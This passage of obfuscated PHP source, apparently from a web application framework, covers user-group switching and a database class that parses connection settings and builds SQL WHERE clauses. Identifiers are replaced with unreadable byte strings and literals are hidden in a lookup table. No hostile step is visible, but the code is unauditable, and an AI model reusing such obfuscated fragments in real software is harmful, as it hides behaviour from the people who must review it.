$¯ôìô–Ô =& $_SERVER[º·Ï‹¥³]; $ñ’©ô¼İ = $this->getInfo($‰ »éÊÈ); if (!$ñ’©ô¼İ) { return array(); } $ò…ƒ ½Â = $this->parentLevelArray($ñ’©ô¼İ[$¯ôìô–Ô[569]]); $ìÁ±ü‹ = array($‰ »éÊÈ); if (count($ò…ƒ ½Â) == 0) { return $ìÁ±ü‹; } if ($‘õÅÁú && count($ò…ƒ ½Â) == 1) { return $ìÁ±ü‹; } if (!$ñ’©ô¼İ[$¯ôìô–Ô[523]] || !isset($ñ’©ô¼İ[$¯ôìô–Ô[523]][$¯ôìô–Ô[2043]]) || $ñ’©ô¼İ[$¯ôìô–Ô[523]][$¯ôìô–Ô[2043]] == $¯ôìô–Ô[2008]) { return $this->groupShowRoot($ò…ƒ ½Â[count($ò…ƒ ½Â) - 1], $‘õÅÁú); } if ($ñ’©ô¼İ[$¯ôìô–Ô[523]][$¯ôìô–Ô[2043]] == $¯ôìô–Ô[417]) { $ò·Æš¡Ô = explode($¯ôìô–Ô[50], $ñ’©ô¼İ[$¯ôìô–Ô[523]][$¯ôìô–Ô[2044]]); if ($ò·Æš¡Ô) { $ìÁ±ü‹ = array_merge($ìÁ±ü‹, $ò·Æš¡Ô); } } return $ìÁ±ü‹; } protected function resetParentLevel() { $¢ªèÆ¿£ =& $_SERVER[º·Ï‹¥³]; $½ªèÙğ¦ = $¢ªèÆ¿£[1952]; $œ•ˆ»æä = $this->select(); $œ•ˆ»æä = array_to_keyvalue($œ•ˆ»æä, $½ªèÙğ¦); foreach ($œ•ˆ»æä as $—‡ÌËª) { $üŸ ³ú¿ = $—‡ÌËª; $ôµÉ¬ó = array(); while ($üŸ ³ú¿[$¢ªèÆ¿£[183]] != 0) { $ôµÉ¬ó[] = $üŸ ³ú¿[$¢ªèÆ¿£[183]]; $üŸ ³ú¿ = $œ•ˆ»æä[$üŸ ³ú¿[$¢ªèÆ¿£[183]]]; } $ôµÉ¬ó[] = 0; $ôµÉ¬ó = $¢ªèÆ¿£[50] . implode($¢ªèÆ¿£[50], array_reverse($ôµÉ¬ó)) . $¢ªèÆ¿£[50]; $this->setNamePinyin($—‡ÌËª[$½ªèÙğ¦], $—‡ÌËª[$¢ªèÆ¿£[32]]); $this->where(array($½ªèÙğ¦ => $—‡ÌËª[$½ªèÙğ¦]))->save(array($¢ªèÆ¿£[636] => $ôµÉ¬ó)); } return $œ•ˆ»æä; } public function groupNameAuto($ÎÚèÇŞ, $¢¥Ïñäª) { $âã–‘˜ =& $_SERVER[º·Ï‹¥³]; $ğ¢÷Ø¨— = $this->where(array($âã–‘˜[461] => $ÎÚèÇŞ))->getField($âã–‘˜[32], !0); if (!$ğ¢÷Ø¨— || !in_array($¢¥Ïñäª, $ğ¢÷Ø¨—)) { return $¢¥Ïñäª; } for ($¯ìÔáÉ… = 1; $¯ìÔáÉ… <= count($ğ¢÷Ø¨—) + 1; $¯ìÔáÉ…++) { $–½ù®²â = $¢¥Ïñäª . "\50{$¯ìÔáÉ…}\x29"; if (!in_array($–½ù®²â, $ğ¢÷Ø¨—)) { return $–½ù®²â; } } } public function groupSwitch($õ‡ÕÇØ, $à§¹äÎ½) { $ºí§ş‡ğ =& $_SERVER[º·Ï‹¥³]; $Û±òÃ€Ã = array($ºí§ş‡ğ[1952] => array($ºí§ş‡ğ[7], array($õ‡ÕÇØ, $à§¹äÎ½))); $¦ãâ’Ì¾ = $this->where($Û±òÃ€Ã)->select(); $¦ãâ’Ì¾ = array_to_keyvalue($¦ãâ’Ì¾, $ºí§ş‡ğ[1952]); if (!isset($¦ãâ’Ì¾[$õ‡ÕÇØ]) || !isset($¦ãâ’Ì¾[$à§¹äÎ½]) || $¦ãâ’Ì¾[$õ‡ÕÇØ][$ºí§ş‡ğ[183]] == 0) { return !1; } $Û±òÃ€Ã = array($ºí§ş‡ğ[1952] => $õ‡ÕÇØ); $èòÊ„ªë = Model($ºí§ş‡ğ[2047])->where($Û±òÃ€Ã)->select(); if (!$èòÊ„ªë) { $èòÊ„ªë = array(); } foreach ($èòÊ„ªë as $¯«ÉÉ©€) { $õÏÚøîš = $¯«ÉÉ©€[$ºí§ş‡ğ[1754]]; $Û±òÃ€Ã = array($ºí§ş‡ğ[1754] => $õÏÚøîš, $ºí§ş‡ğ[1952] => $à§¹äÎ½); $ä„¬°ÈÔ = Model($ºí§ş‡ğ[2047])->where($Û±òÃ€Ã)->find(); if (!$ä„¬°ÈÔ) { $ì¸÷èò¶ = array($à§¹äÎ½ => $¯«ÉÉ©€[$ºí§ş‡ğ[2061]]); Model($ºí§ş‡ğ[583])->userGroupAdd($õÏÚøîš, $ì¸÷èò¶); } Model($ºí§ş‡ğ[583])->userGroupRemove($õÏÚøîš, $õ‡ÕÇØ); } $Û±òÃ€Ã = array($ºí§ş‡ğ[181] => 2, $ºí§ş‡ğ[183] => 0, $ºí§ş‡ğ[469] => 1, $ºí§ş‡ğ[554] => array($ºí§ş‡ğ[7], array($õ‡ÕÇØ, $à§¹äÎ½))); $ÄÔÆôÔÄ = Model($ºí§ş‡ğ[876])->where($Û±òÃ€Ã)->field($ºí§ş‡ğ[2062])->select(); $ÄÔÆôÔÄ = array_to_keyvalue($ÄÔÆôÔÄ, $ºí§ş‡ğ[554], $ºí§ş‡ğ[184]); $Ó€Øµ‡î = !empty($ÄÔÆôÔÄ[$õ‡ÕÇØ]) ? $ÄÔÆôÔÄ[$õ‡ÕÇØ] : !1; if ($Ó€Øµ‡î) { if (!$ÄÔÆôÔÄ[$à§¹äÎ½]) { $ÄÔÆôÔÄ[$à§¹äÎ½] = Model($ºí§ş‡ğ[876])->groupRootAdd($à§¹äÎ½); } $ñÔå×Ûë = $ÄÔÆôÔÄ[$à§¹äÎ½]; $Û±òÃ€Ã = array($ºí§ş‡ğ[183] => $Ó€Øµ‡î); $ÄÔÆôÔÄ = Model($ºí§ş‡ğ[876])->where($Û±òÃ€Ã)->field($ºí§ş‡ğ[2063])->select(); if (!$ÄÔÆôÔÄ) { $ÄÔÆôÔÄ = array(); } Model($ºí§ş‡ğ[876])->moveClearAuth = !1; foreach ($ÄÔÆôÔÄ as $Ğ½À®©§) { $¤ì­È°æ = $Ğ½À®©§[$ºí§ş‡ğ[469]] == $ºí§ş‡ğ[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ºí§ş‡ğ[876])->move($Ğ½À®©§[$ºí§ş‡ğ[184]], $ñÔå×Ûë, $¤ì­È°æ); } Model($ºí§ş‡ğ[876])->moveClearAuth = !0; $Û±òÃ€Ã = array($ºí§ş‡ğ[181] => 2, $ºí§ş‡ğ[554] => $õ‡ÕÇØ); $°íˆ…ó = array($ºí§ş‡ğ[554] => $à§¹äÎ½); Model($ºí§ş‡ğ[2064])->where($Û±òÃ€Ã)->save($°íˆ…ó); Model($ºí§ş‡ğ[2065])->where($Û±òÃ€Ã)->save($°íˆ…ó); } $this->_changeChildLevel($¦ãâ’Ì¾[$õ‡ÕÇØ], $¦ãâ’Ì¾[$à§¹äÎ½], !0); $this->where(array($ºí§ş‡ğ[183] => $õ‡ÕÇØ))->save(array($ºí§ş‡ğ[183] => $à§¹äÎ½)); $this->_clearChildrenCache($¦ãâ’Ì¾[$à§¹äÎ½]); return !0; } } goto dÍÈÚ«ÈêÙ; féöµïÅ©: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\x68\151\x6e\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\x3d", "\x6e\145\x71" => "\x3c\76", "\147\164" => "\x3e", "\x65\x67\164" => "\x3e\x3d", "\x6c\x74" => "\74", "\x65\x6c\x74" => "\x3c\x3d", "\x6e\157\x74\x6c\x69\153\145" => "\116\117\124\40\114\x49\113\105", "\154\x69\x6b\145" => "\114\111\113\x45", "\x69\x6e" => "\111\x4e", "\x6e\x6f\x74\x69\x6e" => "\x4e\x4f\124\x20\111\x4e", "\156\x6f\x74\40\x69\x6e" => "\116\x4f\x54\40\111\x4e", "\x62\145\164\x77\x65\x65\156" => "\x42\105\124\x57\105\105\x4e", "\156\157\164\x62\x65\164\167\x65\145\x6e" => "\x4e\x4f\x54\40\x42\105\x54\127\x45\x45\116", "\x6e\x6f\164\40\x62\145\x74\167\x65\145\156" => "\116\117\x54\x20\102\105\124\x57\105\105\x4e"); protected $selectSql = "\x53\x45\x4c\105\x43\x54\x25\x44\x49\x53\124\x49\x4e\x43\x54\45\x20\x25\x46\x49\x45\x4c\x44\x25\40\x46\122\x4f\x4d\40\x25\x54\101\102\114\105\45\45\x4a\117\x49\x4e\45\45\127\x48\x45\x52\x45\x25\45\107\x52\x4f\125\120\45\x25\110\101\126\111\116\107\45\x25\117\x52\x44\105\x52\x25\x25\114\111\115\x49\124\x25\x20\x25\125\116\x49\x4f\116\x25\45\x43\x4f\115\115\x45\116\x54\45"; protected $bind = array(); public static function getInstance() { $ÂÇÅò§´ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[º·Ï‹¥³][1009], $ÂÇÅò§´); } public function factory($’ÎÍä·Î = '') { $ ÔŠÒ¥ =& $_SERVER[º·Ï‹¥³]; $’ÎÍä·Î = $this->parseConfig($’ÎÍä·Î); if (empty($’ÎÍä·Î[$ ÔŠÒ¥[1010]])) { think_exception(think_lang($ ÔŠÒ¥[1011])); } $this->dbType = ucwords(strtolower($’ÎÍä·Î[$ ÔŠÒ¥[1010]])); $¼…¸¬‘ = $ ÔŠÒ¥[1012] . $this->dbType; if (class_exists($¼…¸¬‘)) { $øÎ°ë‰ = new $¼…¸¬‘($’ÎÍä·Î); if ($ ÔŠÒ¥[1013] != strtolower($’ÎÍä·Î[$ ÔŠÒ¥[1010]])) { $øÎ°ë‰->dbType = strtoupper($this->dbType); } else { $øÎ°ë‰->dbType = $this->_getDsnType($’ÎÍä·Î[$ ÔŠÒ¥[965]]); } } else { think_exception(think_lang($ ÔŠÒ¥[1014]) . $ ÔŠÒ¥[1015] . $¼…¸¬‘); } return $øÎ°ë‰; } public function __call($Û—ÌÚûé, $…õŞæ±¨) { if (method_exists($this, $Û—ÌÚûé)) { return call_user_func_array(array($this, $Û—ÌÚûé), $…õŞæ±¨); } } protected function _getDsnType($Şí‡×¿) { $ÒØ¬­‘ş = explode($_SERVER[º·Ï‹¥³][4], $Şí‡×¿); $÷¦ü…€ = strtoupper(trim($ÒØ¬­‘ş[0])); return $÷¦ü…€; } private function parseConfig($Ü¶Æ»‰ = '') { $ÅîÙ¹á€ =& $_SERVER[º·Ï‹¥³]; if (!empty($Ü¶Æ»‰) && is_string($Ü¶Æ»‰)) { $Ü¶Æ»‰ = $this->parseDSN($Ü¶Æ»‰); } elseif (is_array($Ü¶Æ»‰)) { $Ü¶Æ»‰ = array_change_key_case($Ü¶Æ»‰); $Ü¶Æ»‰ = array($ÅîÙ¹á€[1010] => $Ü¶Æ»‰[$ÅîÙ¹á€[1016]], $ÅîÙ¹á€[937] => $Ü¶Æ»‰[$ÅîÙ¹á€[1017]], $ÅîÙ¹á€[938] => $Ü¶Æ»‰[$ÅîÙ¹á€[1018]], $ÅîÙ¹á€[935] => $Ü¶Æ»‰[$ÅîÙ¹á€[1019]], $ÅîÙ¹á€[936] => $Ü¶Æ»‰[$ÅîÙ¹á€[1020]], $ÅîÙ¹á€[21] => $Ü¶Æ»‰[$ÅîÙ¹á€[1021]], $ÅîÙ¹á€[965] => $Ü¶Æ»‰[$ÅîÙ¹á€[1022]], $ÅîÙ¹á€[17] => isset($Ü¶Æ»‰[$ÅîÙ¹á€[1023]]) ? $Ü¶Æ»‰[$ÅîÙ¹á€[1023]] : array()); } elseif (empty($Ü¶Æ»‰)) { if (think_config($ÅîÙ¹á€[1024]) && $ÅîÙ¹á€[1013] != strtolower(think_config($ÅîÙ¹á€[1025]))) { $Ü¶Æ»‰ = $this->parseDSN(think_config($ÅîÙ¹á€[1024])); } else { $Ü¶Æ»‰ = array($ÅîÙ¹á€[1010] => think_config($ÅîÙ¹á€[1025]), $ÅîÙ¹á€[937] => think_config($ÅîÙ¹á€[1026]), $ÅîÙ¹á€[938] => think_config($ÅîÙ¹á€[1027]), $ÅîÙ¹á€[935] => think_config($ÅîÙ¹á€[1028]), $ÅîÙ¹á€[936] => think_config($ÅîÙ¹á€[1029]), $ÅîÙ¹á€[21] => think_config($ÅîÙ¹á€[298]), $ÅîÙ¹á€[965] => think_config($ÅîÙ¹á€[1024]), $ÅîÙ¹á€[17] => think_config($ÅîÙ¹á€[1030])); } } return $Ü¶Æ»‰; } protected function initConnect($«©ƒÄ±Ò = true) { if (1 == think_config($_SERVER[º·Ï‹¥³][22])) { $this->_linkID = $this->multiConnect($«©ƒÄ±Ò); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $õ•³§†ê => $Ìşßåâ„) { $this->_linkID = $Ìşßåâ„; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($‹›åá„Á = false) { $¨Î¢¡°› =& $_SERVER[º·Ï‹¥³]; static $Ìó–…³± = array(); static $“ç»ÕøË = -1; if (empty($Ìó–…³±)) { foreach ($this->config as $¨ÜÍ—É => $±æâ×ø) { $Ìó–…³±[$¨ÜÍ—É] = explode($¨Î¢¡°›[50], $±æâ×ø); } } if (think_config($¨Î¢¡°›[1031])) { if ($‹›åá„Á || think_config($¨Î¢¡°›[455]) === !0) { $‹ÜÃÓ› = floor(mt_rand(0, think_config($¨Î¢¡°›[1032]) - 1)); $“ç»ÕøË = $‹ÜÃÓ›; } else { if (is_numeric(think_config($¨Î¢¡°›[1033]))) { $‹ÜÃÓ› = think_config($¨Î¢¡°›[1033]); } else { $‹ÜÃÓ› = floor(mt_rand(think_config($¨Î¢¡°›[1032]), count($Ìó–…³±[$¨Î¢¡°›[935]]) - 1)); } } } else { $‹ÜÃÓ› = floor(mt_rand(0, count($Ìó–…³±[$¨Î¢¡°›[935]]) - 1)); $“ç»ÕøË = $‹ÜÃÓ›; } $‹ÜÃÓ› = $“ç»ÕøË !== -1 ? $“ç»ÕøË : $‹ÜÃÓ›; $Úìîûéá = array($¨Î¢¡°›[937] => isset($Ìó–…³±[$¨Î¢¡°›[937]][$‹ÜÃÓ›]) ? $Ìó–…³±[$¨Î¢¡°›[937]][$‹ÜÃÓ›] : $Ìó–…³±[$¨Î¢¡°›[937]][0], $¨Î¢¡°›[938] => isset($Ìó–…³±[$¨Î¢¡°›[938]][$‹ÜÃÓ›]) ? $Ìó–…³±[$¨Î¢¡°›[938]][$‹ÜÃÓ›] : $Ìó–…³±[$¨Î¢¡°›[938]][0], $¨Î¢¡°›[935] => isset($Ìó–…³±[$¨Î¢¡°›[935]][$‹ÜÃÓ›]) ? $Ìó–…³±[$¨Î¢¡°›[935]][$‹ÜÃÓ›] : $Ìó–…³±[$¨Î¢¡°›[935]][0], $¨Î¢¡°›[936] => isset($Ìó–…³±[$¨Î¢¡°›[936]][$‹ÜÃÓ›]) ? $Ìó–…³±[$¨Î¢¡°›[936]][$‹ÜÃÓ›] : $Ìó–…³±[$¨Î¢¡°›[936]][0], $¨Î¢¡°›[21] => isset($Ìó–…³±[$¨Î¢¡°›[21]][$‹ÜÃÓ›]) ? $Ìó–…³±[$¨Î¢¡°›[21]][$‹ÜÃÓ›] : $Ìó–…³±[$¨Î¢¡°›[21]][0], $¨Î¢¡°›[965] => isset($Ìó–…³±[$¨Î¢¡°›[965]][$‹ÜÃÓ›]) ? $Ìó–…³±[$¨Î¢¡°›[965]][$‹ÜÃÓ›] : $Ìó–…³±[$¨Î¢¡°›[965]][0], $¨Î¢¡°›[17] => isset($Ìó–…³±[$¨Î¢¡°›[17]][$‹ÜÃÓ›]) ? $Ìó–…³±[$¨Î¢¡°›[17]][$‹ÜÃÓ›] : $Ìó–…³±[$¨Î¢¡°›[17]][0]); return $this->connect($Úìîûéá, $‹ÜÃÓ›); } public function parseDSN($Î®¿»Ş…) { $Ì¢û¾²ò =& $_SERVER[º·Ï‹¥³]; if (empty($Î®¿»Ş…)) { return !1; } $É­Û¾¿´ = parse_url($Î®¿»Ş…); if ($É­Û¾¿´[$Ì¢û¾²ò[198]]) { $Œ¾‘û¯ = array($Ì¢û¾²ò[1010] => $É­Û¾¿´[$Ì¢û¾²ò[198]], $Ì¢û¾²ò[937] => isset($É­Û¾¿´[$Ì¢û¾²ò[646]]) ? $É­Û¾¿´[$Ì¢û¾²ò[646]] : $Ì¢û¾²ò[12], $Ì¢û¾²ò[938] => isset($É­Û¾¿´[$Ì¢û¾²ò[1034]]) ? $É­Û¾¿´[$Ì¢û¾²ò[1034]] : $Ì¢û¾²ò[12], $Ì¢û¾²ò[935] => isset($É­Û¾¿´[$Ì¢û¾²ò[199]]) ? $É­Û¾¿´[$Ì¢û¾²ò[199]] : $Ì¢û¾²ò[12], $Ì¢û¾²ò[936] => isset($É­Û¾¿´[$Ì¢û¾²ò[200]]) ? $É­Û¾¿´[$Ì¢û¾²ò[200]] : $Ì¢û¾²ò[12], $Ì¢û¾²ò[21] => isset($É­Û¾¿´[$Ì¢û¾²ò[87]]) ? substr($É­Û¾¿´[$Ì¢û¾²ò[87]], 1) : $Ì¢û¾²ò[12]); } else { preg_match($Ì¢û¾²ò[1035], trim($Î®¿»Ş…), $–ı®ĞáÕ); $Œ¾‘û¯ = array($Ì¢û¾²ò[1010] => $–ı®ĞáÕ[1], $Ì¢û¾²ò[937] => $–ı®ĞáÕ[2], $Ì¢û¾²ò[938] => $–ı®ĞáÕ[3], $Ì¢û¾²ò[935] => $–ı®ĞáÕ[4], $Ì¢û¾²ò[936] => $–ı®ĞáÕ[5], $Ì¢û¾²ò[21] => $–ı®ĞáÕ[6]); } $Œ¾‘û¯[$Ì¢û¾²ò[965]] = $Ì¢û¾²ò[12]; return $Œ¾‘û¯; } protected function debug() { $€‘Ó ÎŸ =& $_SERVER[º·Ï‹¥³]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $€‘Ó ÎŸ[1036]; if (think_config($€‘Ó ÎŸ[1037])) { think_status($€‘Ó ÎŸ[1038]); think_trace($this->queryStr . $€‘Ó ÎŸ[1039] . think_status($€‘Ó ÎŸ[24], $€‘Ó ÎŸ[1038], 6) . $€‘Ó ÎŸ[1040], $€‘Ó ÎŸ[12], $€‘Ó ÎŸ[1041]); } } protected function parseLock($ŸÅ†˜³ = false) { $”ãÇÉ”½ =& $_SERVER[º·Ï‹¥³]; if (!$ŸÅ†˜³) { return $”ãÇÉ”½[12]; } if ($”ãÇÉ”½[967] == $this->dbType) { return $”ãÇÉ”½[1042]; } return $”ãÇÉ”½[1043]; } protected function parseSet($°ã¯ÍÃÓ) { $¤ÌÂ±ÔÓ =& $_SERVER[º·Ï‹¥³]; foreach ($°ã¯ÍÃÓ as $†§¥±‹¶ => $Á¦£š¦„) { if (is_array($Á¦£š¦„) && $¤ÌÂ±ÔÓ[348] == $Á¦£š¦„[0]) { $ÑÓ¼ê´î[] = $this->parseKey($†§¥±‹¶) . $¤ÌÂ±ÔÓ[933] . $Á¦£š¦„[1]; } elseif (is_scalar($Á¦£š¦„) || is_null($Á¦£š¦„)) { $ÑÓ¼ê´î[] = $this->parseKey($†§¥±‹¶) . $¤ÌÂ±ÔÓ[933] . $this->parseValue($Á¦£š¦„); } } return $¤ÌÂ±ÔÓ[1044] . implode($¤ÌÂ±ÔÓ[50], $ÑÓ¼ê´î); } protected function bindParam($´İ³“±½, $¿«ÓëÑŞ) { $this->bind[$_SERVER[º·Ï‹¥³][4] . $´İ³“±½] = $¿«ÓëÑŞ; } protected function parseBind($•¼äç¨Ó) { $•¼äç¨Ó = array_merge($this->bind, $•¼äç¨Ó); $this->bind = array(); return $•¼äç¨Ó; } function parseKey(&$·›Î«ı×, $ºÊ÷¨ÀÍ = true) { if ($ºÊ÷¨ÀÍ) { $·›Î«ı× = $this->parseKeyCheck($·›Î«ı×); } return $·›Î«ı×; } function parseKeyCheck($¨ú”ŠŸ¸) { $¬îÓŸßº =& $_SERVER[º·Ï‹¥³]; $¨ú”ŠŸ¸ = trim($¨ú”ŠŸ¸); if (!preg_match($¬îÓŸßº[1045], $¨ú”ŠŸ¸)) { think_exception($¬îÓŸßº[1046] . $¨ú”ŠŸ¸); } return $¨ú”ŠŸ¸; } protected function parseValue($ªóöâ) { $ñ°ˆ±ûæ =& $_SERVER[º·Ï‹¥³]; if (is_string($ªóöâ)) { $ªóöâ = $ñ°ˆ±ûæ[1006] . $this->escapeString($ªóöâ) . $ñ°ˆ±ûæ[1006]; } elseif (isset($ªóöâ[0]) && is_string($ªóöâ[0]) && strtolower($ªóöâ[0]) == $ñ°ˆ±ûæ[348]) { $ªóöâ = $this->escapeString($ªóöâ[1]); } elseif (is_array($ªóöâ)) { $ªóöâ = array_map(array($this, $ñ°ˆ±ûæ[1007]), $ªóöâ); } elseif (is_bool($ªóöâ)) { $ªóöâ = $ªóöâ ? $ñ°ˆ±ûæ[91] : $ñ°ˆ±ûæ[219]; } elseif (is_null($ªóöâ)) { $ªóöâ = $ñ°ˆ±ûæ[106]; } return $ªóöâ; } protected function parseField($İ´Ú™) { $çøĞêƒ =& $_SERVER[º·Ï‹¥³]; if (is_string($İ´Ú™) && strpos($İ´Ú™, $çøĞêƒ[50])) { $İ´Ú™ = explode($çøĞêƒ[50], $İ´Ú™); } if (is_array($İ´Ú™)) { $Ñß€½İî = array(); foreach ($İ´Ú™ as $ÊåÈ³Ò° => $Ù„ÑßÉ) { if (!is_numeric($ÊåÈ³Ò°)) { $Ñß€½İî[] = $this->parseKey($ÊåÈ³Ò°, !1) . $çøĞêƒ[1047] . $this->parseKey($Ù„ÑßÉ); } else { $Ñß€½İî[] = $this->parseKey($Ù„ÑßÉ); } } $³³æ–Ñ = implode($çøĞêƒ[50], $Ñß€½İî); } elseif (is_string($İ´Ú™) && !empty($İ´Ú™)) { $³³æ–Ñ = $İ´Ú™; } else { $³³æ–Ñ = $çøĞêƒ[211]; } return $³³æ–Ñ; } protected function parseTable($¾Ùï…è) { $Ï¯ùŞĞ =& $_SERVER[º·Ï‹¥³]; if (is_array($¾Ùï…è)) { $ôâšËÌÒ = array(); foreach ($¾Ùï…è as $ì÷ãı…ƒ => $Ö‰€¿òÖ) { if (!is_numeric($ì÷ãı…ƒ)) { $ôâšËÌÒ[] = $this->parseKey($ì÷ãı…ƒ) . $Ï¯ùŞĞ[53] . $this->parseKey($Ö‰€¿òÖ); } else { $ôâšËÌÒ[] = $this->parseKey($ì÷ãı…ƒ); } } $¾Ùï…è = $ôâšËÌÒ; } elseif (is_string($¾Ùï…è)) { if (strstr($¾Ùï…è, $Ï¯ùŞĞ[53])) { return $¾Ùï…è; } $¾Ùï…è = explode($Ï¯ùŞĞ[50], $¾Ùï…è); array_walk($¾Ùï…è, array($this, $Ï¯ùŞĞ[955])); } return $Ï¯ùŞĞ[949] . trim(implode($Ï¯ùŞĞ[1048], $¾Ùï…è), $Ï¯ùŞĞ[445]) . $Ï¯ùŞĞ[949]; } protected function parseWhere($íªÓ—Õ) { $Î˜’ü… =& $_SERVER[º·Ï‹¥³]; $¶í°ôòÊ = $Î˜’ü…[12]; if (is_string($íªÓ—Õ)) { $¶í°ôòÊ = $íªÓ—Õ; } else { $ªîï˜ÉÃ = isset($íªÓ—Õ[$Î˜’ü…[1049]]) ? strtoupper($íªÓ—Õ[$Î˜’ü…[1049]]) : $Î˜’ü…[12]; if (in_array($ªîï˜ÉÃ, array($Î˜’ü…[1050], $Î˜’ü…[1051], $Î˜’ü…[1052]))) { $ªîï˜ÉÃ = $Î˜’ü…[53] . $ªîï˜ÉÃ . $Î˜’ü…[53]; unset($íªÓ—Õ[$Î˜’ü…[1049]]); } else { $ªîï˜ÉÃ = $Î˜’ü…[1053]; } foreach ($íªÓ—Õ as $•ŠúÕãŸ => $ùÜ„—µš) { $¶í°ôòÊ .= $Î˜’ü…[329]; if (is_numeric($•ŠúÕãŸ)) { $•ŠúÕãŸ = $Î˜’ü…[1054]; } if (0 === strpos($•ŠúÕãŸ, $Î˜’ü…[11])) { $¶í°ôòÊ .= $this->parseThinkWhere($•ŠúÕãŸ, $ùÜ„—µš); } else { if (!preg_match($Î˜’ü…[1055], trim($•ŠúÕãŸ))) { think_exception(think_lang($Î˜’ü…[1056]) . $Î˜’ü…[4] . $•ŠúÕãŸ); } $˜ªßÔø‘ = is_array($ùÜ„—µš) && isset($ùÜ„—µš[$Î˜’ü…[1057]]); $•ŠúÕãŸ = trim($•ŠúÕãŸ); if (strpos($•ŠúÕãŸ, $Î˜’ü…[205])) { $½šÃ™¹ = explode($Î˜’ü…[205], $•ŠúÕãŸ); $‰ºŒ“ùÁ = array(); foreach ($½šÃ™¹ as $šÈÚ¤Ó => $½ºªè×˜) { $ºçü¬¹¬ = $˜ªßÔø‘ ? $ùÜ„—µš[$šÈÚ¤Ó] : $ùÜ„—µš; $‰ºŒ“ùÁ[] = $Î˜’ü…[312] . $this->parseWhereItem($this->parseKey($½ºªè×˜), $ºçü¬¹¬) . $Î˜’ü…[954]; } $¶í°ôòÊ .= implode($Î˜’ü…[1058], $‰ºŒ“ùÁ); } elseif (strpos($•ŠúÕãŸ, $Î˜’ü…[335])) { $½šÃ™¹ = explode($Î˜’ü…[335], $•ŠúÕãŸ); $‰ºŒ“ùÁ = array(); foreach ($½šÃ™¹ as $šÈÚ¤Ó => $½ºªè×˜) { $ºçü¬¹¬ = $˜ªßÔø‘ ? $ùÜ„—µš[$šÈÚ¤Ó] : $ùÜ„—µš; $‰ºŒ“ùÁ[] = $Î˜’ü…[312] . $this->parseWhereItem($this->parseKey($½ºªè×˜), $ºçü¬¹¬) . $Î˜’ü…[954]; } $¶í°ôòÊ .= implode($Î˜’ü…[1053], $‰ºŒ“ùÁ); } else { $¶í°ôòÊ .= $this->parseWhereItem($this->parseKey($•ŠúÕãŸ), $ùÜ„—µš); } } $¶í°ôòÊ .= $Î˜’ü…[330] . $ªîï˜ÉÃ; } $¶í°ôòÊ = substr($¶í°ôòÊ, 0, -strlen($ªîï˜ÉÃ)); } return empty($¶í°ôòÊ) ? $Î˜’ü…[12] : $Î˜’ü…[1059] . $¶í°ôòÊ; } protected function parseWhereItem($ïŠºÂµ, $“Ñ¬”à¿) { $İà’œõø =& $_SERVER[º·Ï‹¥³]; $Í›¸Š½¥ = $İà’œõø[12]; if (is_array($“Ñ¬”à¿)) { if (is_string($“Ñ¬”à¿[0])) { $şŸ¹Çº = strtolower($“Ñ¬”à¿[0]); if (in_array($“Ñ¬”à¿[0], array($İà’œõø[933], $İà’œõø[1060], $İà’œõø[1061], $İà’œõø[1062], $İà’œõø[1063], $İà’œõø[1064]))) { $Í›¸Š½¥ .= $ïŠºÂµ . $İà’œõø[53] . $“Ñ¬”à¿[0] . $İà’œõø[53] . $this->parseValue($“Ñ¬”à¿[1]); } elseif (preg_match($İà’œõø[1065], $“Ñ¬”à¿[0])) { $Í›¸Š½¥ .= $ïŠºÂµ . $İà’œõø[53] . $this->exp[$şŸ¹Çº] . $İà’œõø[53] . $this->parseValue($“Ñ¬”à¿[1]); } elseif (preg_match($İà’œõø[1066], $“Ñ¬”à¿[0])) { if (is_array($“Ñ¬”à¿[1])) { $–Éá«…Ò = isset($“Ñ¬”à¿[2]) ? strtoupper($“Ñ¬”à¿[2]) : $İà’œõø[1051]; if (in_array($–Éá«…Ò, array($İà’œõø[1050], $İà’œõø[1051], $İà’œõø[1052]))) { $î¶ù³¿ = array(); foreach ($“Ñ¬”à¿[1] as $…Òî€‘Á) { $î¶ù³¿[] = $ïŠºÂµ . $İà’œõø[53] . $this->exp[$şŸ¹Çº] . $İà’œõø[53] . $this->parseValue($…Òî€‘Á); } $Í›¸Š½¥ .= $İà’œõø[312] . implode($İà’œõø[53] . $–Éá«…Ò . $İà’œõø[53], $î¶ù³¿) . $İà’œõø[954]; } } else { $Í›¸Š½¥ .= $ïŠºÂµ . $İà’œõø[53] . $this->exp[$şŸ¹Çº] . $İà’œõø[53] . $this->parseValue($“Ñ¬”à¿[1]); } } elseif ($İà’œõø[348] == $şŸ¹Çº) { $Í›¸Š½¥ .= $İà’œõø[952] . $ïŠºÂµ . $İà’œõø[53] . $“Ñ¬”à¿[1] . $İà’œõø[1067]; } elseif (preg_match($İà’œõø[1068], $“Ñ¬”à¿[0])) { $Í›¸Š½¥ .= $“Ñ¬”à¿[0]; } elseif (preg_match($İà’œõø[1069], $“Ñ¬”à¿[0])) { if (isset($“Ñ¬”à¿[2]) && $İà’œõø[348] == $“Ñ¬”à¿[2]) { $Í›¸Š½¥ .= $ïŠºÂµ . $İà’œõø[53] . $this->exp[$şŸ¹Çº] . $İà’œõø[53] . $“Ñ¬”à¿[1]; } else { if (is_string($“Ñ¬”à¿[1])) { $“Ñ¬”à¿[1] = explode($İà’œõø[50], $“Ñ¬”à¿[1]); } $İ»éúá† = implode($İà’œõø[50], $this->parseValue($“Ñ¬”à¿[1])); $Í›¸Š½¥ .= $ïŠºÂµ . $İà’œõø[53] . $this->exp[$şŸ¹Çº] . $İà’œõø[952] . $İ»éúá† . $İà’œõø[954]; } } elseif (preg_match($İà’œõø[1070], $“Ñ¬”à¿[0])) { $Ç¤È‚Î” = is_string($“Ñ¬”à¿[1]) ? explode($İà’œõø[50], 